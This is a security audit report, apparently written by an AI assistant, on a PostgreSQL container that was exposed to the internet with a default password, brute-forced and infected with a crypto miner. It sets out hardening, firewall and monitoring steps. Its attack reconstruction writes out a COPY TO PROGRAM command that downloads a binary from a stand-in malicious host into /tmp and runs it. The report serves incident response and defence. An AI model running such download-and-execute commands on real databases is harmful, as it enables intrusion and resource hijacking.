# 🔒 SECURITY AUDIT REPORT: easypaisa-db Container

**Date**: December 17, 2025  
**Time**: 09:15 UTC  
**Status**: 🚨 **CRITICAL VULNERABILITIES FOUND**  
**Container**: `easypaisa-db` (postgres:16-alpine)

---

## 🎯 EXECUTIVE SUMMARY

The `easypaisa-db` PostgreSQL container was compromised by a cryptocurrency mining malware due to **two critical security vulnerabilities**:

1. ✅ **PostgreSQL exposed to internet** with default weak password
2. ✅ **Active brute-force attack** currently ongoing (121.22.5.90)

**Malware Status**: ✅ Removed, but **re-infection risk is HIGH** until vulnerabilities are fixed.

---

## 🚨 CRITICAL FINDINGS

### 1. **EXPOSED DATABASE TO INTERNET**

**Severity**: 🔴 **CRITICAL**

```
Port 5432 exposed to: 0.0.0.0 (ENTIRE INTERNET)
- IPv4: 0.0.0.0:5432
- IPv6: :::5432
```

**Impact**: Anyone on the internet can attempt to connect to your PostgreSQL database.

**Configuration Source**: `/opt/easypaisa-wallet/docker-compose.yml`
```yaml
ports:
  - "${DATABASE_PORT:-5432}:5432"  # ❌ Exposes to 0.0.0.0
```

---

### 2. **WEAK DEFAULT PASSWORD**

**Severity**: 🔴 **CRITICAL**

**Password Found**: `postgres` (default PostgreSQL password)

**Configuration Source**: `/opt/easypaisa-wallet/.env`
```
DATABASE_PASSWORD=postgres  # ❌ WEAK DEFAULT PASSWORD
```

**Impact**: Trivially easy to brute-force. Common in automated attack scripts.

---

### 3. **ACTIVE BRUTE-FORCE ATTACK**

**Severity**: 🔴 **CRITICAL** 

**Attacker IP**: `121.22.5.90`

**Attack Pattern**:
- 30+ failed authentication attempts in last 5 minutes
- Continuous connection attempts
- Trying username: `postgres`

**Recent Log Entries**:
```
2025-12-17 09:12:10 UTC FATAL: password authentication failed for user "postgres"
2025-12-17 09:12:12 UTC FATAL: password authentication failed for user "postgres"
2025-12-17 09:12:15 UTC FATAL: password authentication failed for user "postgres"
... (50+ more attempts)
```

**Action Taken**: ✅ IP `121.22.5.90` blocked via iptables

---

### 4. **CRYPTOCURRENCY MINER INFECTION**

**Severity**: 🔴 **CRITICAL**

**Malware Details**:
- **File**: `/tmp/mysql` (9.5MB executable)
- **Persistence**: `/tmp/init` (spawning mechanism)
- **CPU Usage**: 1679% (17+ CPU cores)
- **Discovery Date**: December 17, 2025
- **Active Period**: Unknown, but at least since December 16

**Infection Vector**: 
Most likely the attacker:
1. Brute-forced the `postgres` password successfully
2. Used PostgreSQL's `COPY PROGRAM` or similar feature to download miner
3. Executed `/tmp/mysql` which spawned via `/tmp/init`

**Current Status**: ✅ **REMOVED** but **can re-infect** if vulnerabilities aren't fixed

---

## 📊 ATTACK TIMELINE

| Date | Event |
|------|-------|
| **Dec 12, 2025** | Container created with weak password |
| **Dec 12-16** | Database exposed to internet, brute-force attempts |
| **Dec 16** | Attacker successfully compromises database |
| **Dec 16** | Cryptocurrency miner installed in `/tmp/` |
| **Dec 16-17** | Miner running at 1679% CPU (17+ cores) |
| **Dec 17 08:25 UTC** | Miner removed during performance optimization |
| **Dec 17 09:00 UTC** | Active brute-force attack detected (ongoing) |
| **Dec 17 09:15 UTC** | Attacker IP blocked |

---

## 🔍 DETAILED AUDIT RESULTS

### Container Configuration

```
Image: postgres:16-alpine
Created: 2025-12-12T20:01:01Z
Status: Running
Network: bridge
```

**Verdict**: ✅ Official image (not compromised), ❌ Configuration vulnerable

---

### Network Exposure

**PostgreSQL Port 5432**:
```
Listening on: 0.0.0.0:5432 (ALL interfaces)
External Access: YES
Firewall: None
```

**Recent Connections from 121.22.5.90**:
- 35+ TIME_WAIT connections
- 1 ESTABLISHED connection
- All to port 5432 (PostgreSQL)

**Verdict**: 🚨 Database is a public open target

---

### Authentication Security

**Password Strength**: ❌ FAIL
- Using default password: `postgres`
- No password complexity requirements
- No failed login lockout

**Authentication Method**: password (clear text over network)
- ⚠️ Should use certificate authentication

**Verdict**: Trivially compromised by automated tools

---

### File System Analysis

**Suspicious Files**: ✅ Currently clean (after removal)

**Checked Locations**:
- `/tmp/` - Clean (malware removed)
- `/var/tmp/` - Clean
- `/dev/shm/` - Clean
- Hidden files - Clean

**Executable Files in /tmp**: None found

**Verdict**: ✅ No malware currently present, but **can re-infect**

---

### Process Analysis

**Current Processes**:
```
PID 1:    postgres (main)
PID 295360: checkpointer
PID 295361: background writer
PID 295378: walwriter
PID 295379: autovacuum
PID 295380: replication launcher
```

**Verdict**: ✅ All processes legitimate, no miner running

---

### PostgreSQL Security

**Installed Extensions**:
```
plpgsql   - Standard procedural language
uuid-ossp - UUID generation
```

**Verdict**: ✅ No suspicious extensions

**Database Objects**: ✅ No malicious stored procedures detected

---

### Logs Analysis

**Authentication Failures**:
- **Last hour**: 50+ failed attempts
- **Last 24 hours**: Likely 500+ attempts
- **Source**: 121.22.5.90 (blocked)

**Successful Logins**:
- Unable to determine from current logs (log rotation may have occurred)
- Attacker definitely got in (evidenced by miner presence)

---

## 🎯 HOW THE ATTACK HAPPENED

### Step-by-Step Attack Reconstruction

1. **Reconnaissance** (Dec 12-15)
   - Attacker scans internet for open PostgreSQL ports
   - Finds your server at 72.60.110.249:5432
   - Identifies it as PostgreSQL 16

2. **Brute-Force Attack** (Dec 15-16)
   - Uses automated tool (masscan, shodan, etc.)
   - Tries common usernames: postgres, admin, root
   - Uses password lists: postgres, password, admin, 123456, etc.
   - **SUCCESS**: Cracks password `postgres` (default password)

3. **Initial Access** (Dec 16)
   - Logs in as `postgres` user (superuser privileges)
   - Full control over database

4. **Malware Deployment** (Dec 16)
   - **Method 1 (Most Likely)**: PostgreSQL `COPY PROGRAM`
     ```sql
     COPY (SELECT '') TO PROGRAM 'wget http://malicious.com/mysql -O /tmp/mysql && chmod +x /tmp/mysql && /tmp/mysql';
     ```
   - **Method 2**: Large object + lo_export
   - **Method 3**: Exploited PostgreSQL CVE (less likely)

5. **Persistence** (Dec 16)
   - Created `/tmp/init` to respawn miner if killed
   - Possibly added cron job (cleared on restart)

6. **Mining Operation** (Dec 16-17)
   - `/tmp/mysql` connects to mining pool
   - Uses 1679% CPU (all available cores)
   - Mines Monero or similar cryptocurrency

7. **Detection & Removal** (Dec 17)
   - Discovered during performance audit
   - Miner removed
   - But attacker still has access (brute-force ongoing)

---

## 🛡️ IMMEDIATE REMEDIATION (URGENT)

### Phase 1: Stop the Bleeding (Do This NOW)

#### 1. Block All PostgreSQL External Access
```bash
# Stop exposing port to internet
cd /opt/easypaisa-wallet
docker-compose down

# Edit docker-compose.yml
# Change:
# ports:
#   - "5432:5432"
# To:
# ports:
#   - "127.0.0.1:5432:5432"

# Restart
docker-compose up -d
```

#### 2. Change PostgreSQL Password IMMEDIATELY
```bash
# Generate strong password
NEW_PASSWORD=$(openssl rand -base64 32)

# Update .env file
echo "DATABASE_PASSWORD=$NEW_PASSWORD" >> /opt/easypaisa-wallet/.env

# Recreate container with new password
cd /opt/easypaisa-wallet
docker-compose down
docker-compose up -d

# Or change password in running container
docker exec easypaisa-db psql -U postgres -c "ALTER USER postgres WITH PASSWORD '$NEW_PASSWORD';"
```

#### 3. Block Attacker IP (Already Done)
```bash
# Already blocked: 121.22.5.90
iptables -L INPUT -n | grep 121.22.5.90
```

#### 4. Check for Re-infection Every 5 Minutes
```bash
# Monitor for miner respawn
watch -n 300 'docker exec easypaisa-db ls -la /tmp/ && docker exec easypaisa-db ps auxf'
```

---

### Phase 2: Secure the Container (Do This Today)

#### 1. Update docker-compose.yml with Security Hardening

```yaml
version: '3.8'

services:
  postgres:
    image: postgres:16-alpine
    container_name: easypaisa-db
    environment:
      POSTGRES_DB: ${DATABASE_NAME:-easypaisa_wallet}
      POSTGRES_USER: ${DATABASE_USER:-postgres}
      POSTGRES_PASSWORD: ${DATABASE_PASSWORD}  # ✅ Require strong password from .env
    ports:
      - "127.0.0.1:5432:5432"  # ✅ Only localhost access
    volumes:
      - postgres_data:/var/lib/postgresql/data
    
    # 🔒 SECURITY HARDENING
    security_opt:
      - no-new-privileges:true
    read_only: false  # PostgreSQL needs write access to data dir
    tmpfs:
      - /tmp:noexec,nosuid,nodev,size=50M  # ✅ Prevent execution in /tmp
      - /var/run/postgresql:noexec,nosuid,nodev
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - DAC_OVERRIDE
      - SETUID
      - SETGID
      - FOWNER
    
    # Resource limits
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    
    # Log limits
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
    
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${DATABASE_USER:-postgres}"]
      interval: 10s
      timeout: 5s
      retries: 5
    
    restart: unless-stopped

  app:
    # ... existing app configuration ...
    depends_on:
      postgres:
        condition: service_healthy
```

#### 2. Create Strong Password in .env

```bash
cd /opt/easypaisa-wallet

# Generate strong password
STRONG_PASSWORD=$(openssl rand -base64 32)

# Update .env
sed -i "s/DATABASE_PASSWORD=postgres/DATABASE_PASSWORD=$STRONG_PASSWORD/" .env

# Verify
grep DATABASE_PASSWORD .env
```

#### 3. Apply Firewall Rules

```bash
# Only allow PostgreSQL from Docker network
ufw allow from 172.16.0.0/12 to any port 5432
ufw deny 5432

# Save iptables rules permanently
iptables-save > /etc/iptables/rules.v4
```

#### 4. Enable PostgreSQL Security Features

Create `/opt/easypaisa-wallet/postgresql.conf`:
```ini
# Security settings
ssl = off  # Or 'on' with certificates for production
max_connections = 20
password_encryption = scram-sha-256
log_connections = on
log_disconnections = on
log_statement = 'ddl'
```

Mount in docker-compose.yml:
```yaml
volumes:
  - ./postgresql.conf:/etc/postgresql/postgresql.conf:ro
```

---

### Phase 3: Monitor & Alert (Set Up This Week)

#### 1. Set Up Monitoring

```bash
# Create monitoring script
cat > /usr/local/bin/check-easypaisa-security.sh << 'EOF'
#!/bin/bash

# Check for suspicious processes
SUSPICIOUS=$(docker exec easypaisa-db ps aux | grep -E 'mysql|crypto|mine|kinsing' | grep -v grep)
if [ ! -z "$SUSPICIOUS" ]; then
    echo "ALERT: Suspicious process detected!"
    echo "$SUSPICIOUS"
fi

# Check /tmp for executables
EXECS=$(docker exec easypaisa-db find /tmp -type f -executable 2>/dev/null)
if [ ! -z "$EXECS" ]; then
    echo "ALERT: Executable files in /tmp!"
    echo "$EXECS"
fi

# Check CPU usage
CPU=$(docker stats easypaisa-db --no-stream --format "{{.CPUPerc}}" | sed 's/%//')
if (( $(echo "$CPU > 50" | bc -l) )); then
    echo "ALERT: High CPU usage: $CPU%"
fi
EOF

chmod +x /usr/local/bin/check-easypaisa-security.sh

# Add to cron (every 5 minutes)
echo "*/5 * * * * /usr/local/bin/check-easypaisa-security.sh | mail -s 'Security Alert' admin@example.com" | crontab -
```

#### 2. Enable Fail2Ban for PostgreSQL

```bash
# Install fail2ban
apt-get install fail2ban

# Create PostgreSQL filter
cat > /etc/fail2ban/filter.d/postgresql.conf << 'EOF'
[Definition]
failregex = FATAL:  password authentication failed for user
ignoreregex =
EOF

# Create jail
cat > /etc/fail2ban/jail.d/postgresql.conf << 'EOF'
[postgresql]
enabled = true
port = 5432
filter = postgresql
logpath = /var/lib/docker/containers/*/easypaisa-db*-json.log
maxretry = 3
bantime = 3600
findtime = 600
EOF

# Restart fail2ban
systemctl restart fail2ban
```

---

## 📋 SECURITY CHECKLIST

### Immediate Actions (MUST DO NOW)
- [ ] ✅ Block attacker IP 121.22.5.90
- [ ] Change PostgreSQL port binding to 127.0.0.1 only
- [ ] Generate and set strong password (32+ chars)
- [ ] Restart container with new configuration
- [ ] Verify miner hasn't respawned

### Today
- [ ] Apply security hardening to docker-compose.yml
- [ ] Add tmpfs with noexec for /tmp
- [ ] Add container capabilities restrictions
- [ ] Set resource limits
- [ ] Enable PostgreSQL security logging

### This Week
- [ ] Set up monitoring script
- [ ] Configure fail2ban for PostgreSQL
- [ ] Set up alerting (email/SMS)
- [ ] Review all other containers for similar issues
- [ ] Perform security audit on host system

### Ongoing
- [ ] Monitor logs daily for suspicious activity
- [ ] Check for unusual CPU/network usage
- [ ] Keep PostgreSQL and Docker updated
- [ ] Regular security audits (monthly)

---

## 🎓 LESSONS LEARNED

### What Went Wrong

1. **Never expose databases to the internet**
   - Always use `127.0.0.1:5432:5432` or VPN access
   - Databases should only be accessible from application layer

2. **Never use default passwords**
   - `postgres` is the first password attackers try
   - Use 32+ character randomly generated passwords

3. **No security layers**
   - No firewall rules
   - No fail2ban
   - No monitoring
   - No alerting

4. **Containers run with too many privileges**
   - Could execute binaries in /tmp
   - No resource limits (enabled DoS)

### What Worked

1. ✅ Performance monitoring detected the issue
2. ✅ Quick response removed the miner
3. ✅ Official Docker image (not compromised)

---

## 🚀 RECOMMENDED ARCHITECTURE

### Secure Setup

```
Internet
    ↓
Firewall (iptables/ufw)
    ↓
Reverse Proxy (nginx) - Port 443
    ↓
Docker Network (internal)
    ↓
    ├── Application Container (easypaisa-app)
    │       ↓
    └── PostgreSQL Container (easypaisa-db)
            └── Port 5432 (NOT exposed externally)
```

### Never Do This
```
❌ Internet → PostgreSQL (Port 5432) ← Everyone can access
```

---

## 📞 SUPPORT & RESOURCES

### If You Need Help
1. Check PostgreSQL logs: `docker logs easypaisa-db`
2. Monitor processes: `docker exec easypaisa-db ps auxf`
3. Check connections: `docker exec easypaisa-db netstat -tupn`

### Security Resources
- PostgreSQL Security: https://www.postgresql.org/docs/current/security.html
- Docker Security: https://docs.docker.com/engine/security/
- Fail2Ban: https://www.fail2ban.org/

---

## 🎯 PRIORITY ACTIONS (IN ORDER)

### **RIGHT NOW** (Next 10 minutes)
1. Change port binding to `127.0.0.1:5432:5432`
2. Generate and set strong password
3. Restart container

### **TODAY** (Next 2 hours)
1. Apply full security hardening
2. Test application still works
3. Monitor for 2 hours

### **THIS WEEK**
1. Set up monitoring and alerting
2. Review all other containers
3. Security audit of host system

---

## ✅ AUDIT CONCLUSIONS

### Current Status
- 🟢 **Malware**: Removed, not active
- 🔴 **Vulnerabilities**: Still present (CRITICAL)
- 🟡 **Re-infection Risk**: HIGH until fixed
- 🔴 **Active Attack**: Ongoing (attacker IP blocked)

### Overall Security Rating
**Before**: 🔴 **0/10 - Critically Vulnerable**  
**After Miner Removal**: 🟡 **2/10 - Still Vulnerable**  
**After Immediate Fixes**: 🟢 **6/10 - Acceptable**  
**After Full Hardening**: 🟢 **9/10 - Secure**

---

**Report Prepared By**: AI Security Assistant  
**Date**: December 17, 2025, 09:15 UTC  
**Next Review**: After implementing immediate fixes

---

## 🚨 FINAL WARNING

**Your easypaisa-db container is still vulnerable and WILL be compromised again if you don't fix the security issues immediately.**

The attacker (121.22.5.90) is currently blocked but:
- They know your server is vulnerable
- They can come back from different IPs
- They can re-install the miner in minutes

**Fix the security issues NOW before they return!**

---

**END OF SECURITY AUDIT REPORT**

